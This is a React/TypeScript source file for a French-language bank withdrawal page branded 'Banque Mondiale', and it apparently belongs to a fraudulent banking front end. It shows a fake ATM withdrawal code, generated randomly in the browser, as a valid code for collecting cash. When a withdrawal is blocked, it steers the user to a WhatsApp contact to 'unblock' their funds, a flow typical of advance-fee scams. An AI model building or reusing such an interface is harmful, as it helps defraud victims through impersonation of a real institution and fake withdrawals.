import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Landmark, CheckCircle2, MapPin, ChevronRight, ArrowLeft, Lock, MessageCircle, ShieldAlert } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useGetDashboardSummary, getGetDashboardSummaryQueryKey } from "@workspace/api-client-react";
import { apiPost } from "@/lib/api";
import { useQueryClient } from "@tanstack/react-query";
import { useCurrency } from "@/contexts/currency-context";
import { redirectToBlockPage } from "@/lib/block-redirect";

const QUICK_AMOUNTS_EUR = [20, 50, 100, 200, 500];

const METHODS = [
  { id: "atm", label: "Retrait DAB", detail: "Générer un code de retrait sans carte" },
  { id: "agency", label: "En agence", detail: "Retrait au guichet avec pièce d'identité" },
];

export default function Retrait() {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const { data: summary } = useGetDashboardSummary();
  const { formatAmount, convertAmount, currency } = useCurrency();
  const [amount, setAmount] = useState("");
  const [method, setMethod] = useState("atm");
  const [done, setDone] = useState(false);
  const [loading, setLoading] = useState(false);
  const [newBalance, setNewBalance] = useState<number | null>(null);
  const [withdrawCode] = useState(() => Math.random().toString(36).substring(2, 8).toUpperCase());
  const [blockedState, setBlockedState] = useState<{ reason: string; whatsapp: string } | null>(null);

  const balance = summary?.balance ?? 0;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const num = parseFloat(amount);
    if (!num || num <= 0) {
      toast({ title: "Montant invalide", variant: "destructive" });
      return;
    }
    setLoading(true);
    try {
      const res = await apiPost<{ balance: number; withdrawn: number }>("/api/wallet/retrait", {
        amount: num,
        method,
      });
      setNewBalance(res.balance);
      queryClient.invalidateQueries({ queryKey: getGetDashboardSummaryQueryKey() });
      setDone(true);
    } catch (err: any) {
      // Priorité 1 : erreur de blocage identifiée directement
      if (err.status === 403 || err.code === "WITHDRAWAL_BLOCKED") {
        setBlockedState({ reason: err.message || "", whatsapp: err.whatsapp || "" });
        return;
      }
      // Priorité 2 : erreur de solde
      if (err.message === "Solde insuffisant") {
        toast({
          title: "Solde insuffisant",
          description: `Votre solde est de ${formatAmount(balance, "EUR")}.`,
          variant: "destructive",
        });
        return;
      }
      // Priorité 3 : re-vérifier le blocage (au cas où le serveur retourne un code inattendu)
      try {
        const token = localStorage.getItem("auth_token");
        const checkRes = await fetch("/api/wallet/block-status", {
          headers: token ? { Authorization: `Bearer ${token}` } : {},
        });
        if (checkRes.ok) {
          const status = await checkRes.json();
          if (status.blocked) {
            setBlockedState({ reason: status.reason || err.message || "", whatsapp: status.whatsapp || "" });
            return;
          }
        }
      } catch {}
      // Priorité 4 : toast générique
      toast({ title: "Erreur", description: err.message, variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  if (done) {
    return (
      <div className="max-w-md mx-auto mt-12 space-y-6">
        <div className="text-center space-y-3">
          <CheckCircle2 className="h-16 w-16 text-[#6DC142] mx-auto" />
          <h2 className="text-2xl font-bold text-gray-900">Retrait validé</h2>
          {method === "atm" ? (
            <p className="text-gray-500">Utilisez ce code à un DAB Banque Mondiale dans les 30 minutes.</p>
          ) : (
            <p className="text-gray-500">Présentez-vous en agence avec votre pièce d'identité.</p>
          )}
          {newBalance !== null && (
            <p className="text-sm text-gray-400">
              Nouveau solde : <span className="font-semibold text-gray-700">{formatAmount(newBalance, "EUR")}</span>
            </p>
          )}
        </div>
        {method === "atm" && (
          <Card className="border-2 border-[#003087] shadow-md text-center">
            <CardContent className="pt-6 pb-6">
              <p className="text-xs text-gray-500 uppercase tracking-wide mb-2">Code de retrait</p>
              <p className="text-4xl font-black tracking-[0.3em] text-[#003087]">{withdrawCode}</p>
              <p className="text-xs text-gray-400 mt-3">
                Valable 30 minutes · Montant : {formatAmount(parseFloat(amount), "EUR")}
              </p>
            </CardContent>
          </Card>
        )}
        <Button className="w-full bg-[#003087] hover:bg-[#002060]" onClick={() => { setDone(false); setAmount(""); }}>
          Nouveau retrait
        </Button>
      </div>
    );
  }

  if (blockedState) {
    const waNumber = blockedState.whatsapp.replace(/\D/g, "");
    const waUrl = waNumber
      ? `https://wa.me/${waNumber}?text=${encodeURIComponent("Bonjour, je souhaite débloquer mon retrait sur Banque Mondiale.")}`
      : null;

    return (
      <div className="max-w-md mx-auto mt-8 space-y-5">
        <div className="flex items-center gap-3">
          <button
            onClick={() => setBlockedState(null)}
            className="h-9 w-9 flex items-center justify-center rounded-full bg-gray-100 hover:bg-gray-200 transition-colors shrink-0"
          >
            <ArrowLeft className="h-4 w-4 text-gray-600" />
          </button>
          <h1 className="text-xl font-bold text-gray-900">Retrait bloqué</h1>
        </div>

        {/* Blocked banner */}
        <div className="rounded-2xl border-2 border-red-200 bg-red-50 overflow-hidden">
          <div className="flex items-center gap-3 px-5 py-4 bg-red-100/60 border-b border-red-200">
            <div className="h-10 w-10 rounded-full bg-red-200 flex items-center justify-center shrink-0">
              <Lock className="h-5 w-5 text-red-700" />
            </div>
            <div>
              <p className="text-sm font-bold text-red-800">Retrait temporairement suspendu</p>
              <p className="text-xs text-red-600 mt-0.5">Notre équipe examine votre dossier</p>
            </div>
          </div>
          {blockedState.reason && (
            <div className="px-5 py-4">
              <div className="flex items-start gap-2.5 p-3 rounded-xl bg-white border border-red-100">
                <ShieldAlert className="h-4 w-4 text-red-500 shrink-0 mt-0.5" />
                <div>
                  <p className="text-[10px] font-bold uppercase tracking-wider text-red-400 mb-1">Raison du blocage</p>
                  <p className="text-sm text-red-800 leading-relaxed">{blockedState.reason}</p>
                </div>
              </div>
            </div>
          )}
        </div>

        <p className="text-sm text-gray-500 text-center leading-relaxed">
          Un conseiller Banque Mondiale va examiner votre dossier et vous contactera pour débloquer vos fonds.
        </p>

        {/* WhatsApp button */}
        {waUrl ? (
          <a
            href={waUrl}
            target="_blank"
            rel="noopener noreferrer"
            className="w-full h-14 rounded-2xl font-bold text-base shadow-lg flex items-center justify-center gap-3 text-white no-underline transition-opacity hover:opacity-90"
            style={{ background: "linear-gradient(135deg, #25D366 0%, #128C7E 100%)" }}
          >
            <MessageCircle className="h-6 w-6" />
            Contacter le support WhatsApp
          </a>
        ) : (
          <div className="rounded-xl bg-gray-50 border border-gray-200 px-4 py-4 text-center">
            <p className="text-sm text-gray-500">
              Contactez le service client Banque Mondiale pour débloquer votre retrait.
            </p>
          </div>
        )}

        <Button
          variant="outline"
          className="w-full h-11 border-gray-200 text-gray-600"
          onClick={() => setBlockedState(null)}
        >
          Retour
        </Button>
      </div>
    );
  }

  return (
    <div className="max-w-lg mx-auto space-y-6">
      <div className="flex items-center gap-3">
        <button
          onClick={() => window.history.back()}
          className="h-9 w-9 flex items-center justify-center rounded-full bg-gray-100 hover:bg-gray-200 transition-colors shrink-0"
        >
          <ArrowLeft className="h-4 w-4 text-gray-600" />
        </button>
        <div className="h-10 w-10 rounded-full bg-blue-50 flex items-center justify-center shrink-0">
          <Landmark className="h-5 w-5 text-[#003087]" />
        </div>
        <div>
          <h1 className="text-2xl font-bold text-gray-900">Retrait</h1>
          <p className="text-sm text-gray-500">
            Solde disponible : <span className="font-semibold text-[#003087]">{formatAmount(balance, "EUR")}</span>
          </p>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-5">
        <Card className="border shadow-sm">
          <CardHeader className="pb-3">
            <CardTitle className="text-base">Montant à retirer</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="relative">
              <Input
                type="number"
                min="1"
                step="0.01"
                placeholder="0.00"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="text-2xl font-bold h-14 pr-16 text-center"
              />
              <span className="absolute right-4 top-1/2 -translate-y-1/2 text-sm font-semibold text-gray-400">
                {currency.code}
              </span>
            </div>
            {amount && parseFloat(amount) > 0 && currency.code !== "EUR" && (
              <p className="text-xs text-gray-400 text-center">
                ≈ {(parseFloat(amount) / currency.rateFromEUR).toLocaleString("fr-FR", { minimumFractionDigits: 2 })} EUR débité
              </p>
            )}
            {amount && parseFloat(amount) > balance && (
              <p className="text-xs text-red-500 font-medium flex items-center gap-1">
                ⚠ Solde insuffisant — disponible : {formatAmount(balance, "EUR")}
              </p>
            )}
            <div className="flex gap-2 flex-wrap">
              {QUICK_AMOUNTS_EUR.map((a) => {
                const converted = convertAmount(a, "EUR");
                const isLarge = currency.rateFromEUR > 100;
                const label = isLarge
                  ? `${Math.round(converted).toLocaleString("fr-FR")} ${currency.symbol}`
                  : `${converted.toLocaleString("fr-FR", { minimumFractionDigits: 0, maximumFractionDigits: 2 })} ${currency.symbol}`;
                const eurValue = String(a);
                return (
                  <button
                    key={a}
                    type="button"
                    onClick={() => setAmount(eurValue)}
                    className={`px-3 py-1.5 rounded-full text-sm font-medium border transition-all ${
                      amount === eurValue
                        ? "bg-[#003087] text-white border-[#003087]"
                        : "bg-white text-gray-600 border-gray-200 hover:border-[#003087] hover:text-[#003087]"
                    }`}
                  >
                    {label}
                  </button>
                );
              })}
            </div>
          </CardContent>
        </Card>

        <Card className="border shadow-sm">
          <CardHeader className="pb-3">
            <CardTitle className="text-base">Mode de retrait</CardTitle>
          </CardHeader>
          <CardContent className="space-y-2">
            {METHODS.map((m) => (
              <button
                key={m.id}
                type="button"
                onClick={() => setMethod(m.id)}
                className={`w-full flex items-center gap-4 p-4 rounded-xl border-2 transition-all text-left ${
                  method === m.id ? "border-[#003087] bg-blue-50" : "border-gray-100 hover:border-gray-300"
                }`}
              >
                <div className={`h-10 w-10 rounded-full flex items-center justify-center ${method === m.id ? "bg-[#003087]" : "bg-gray-100"}`}>
                  {m.id === "atm" ? (
                    <Landmark className={`h-5 w-5 ${method === m.id ? "text-white" : "text-gray-500"}`} />
                  ) : (
                    <MapPin className={`h-5 w-5 ${method === m.id ? "text-white" : "text-gray-500"}`} />
                  )}
                </div>
                <div className="flex-1">
                  <p className="font-semibold text-sm text-gray-900">{m.label}</p>
                  <p className="text-xs text-gray-500">{m.detail}</p>
                </div>
                {method === m.id && <ChevronRight className="h-4 w-4 text-[#003087]" />}
              </button>
            ))}
          </CardContent>
        </Card>

        <Button
          type="submit"
          className="w-full h-12 bg-[#003087] hover:bg-[#002060] text-base font-semibold"
          disabled={loading || !amount || parseFloat(amount) > balance}
        >
          {loading
            ? "Traitement..."
            : `Retirer ${amount ? formatAmount(parseFloat(amount), "EUR") : ""}`}
        </Button>
      </form>
    </div>
  );
}
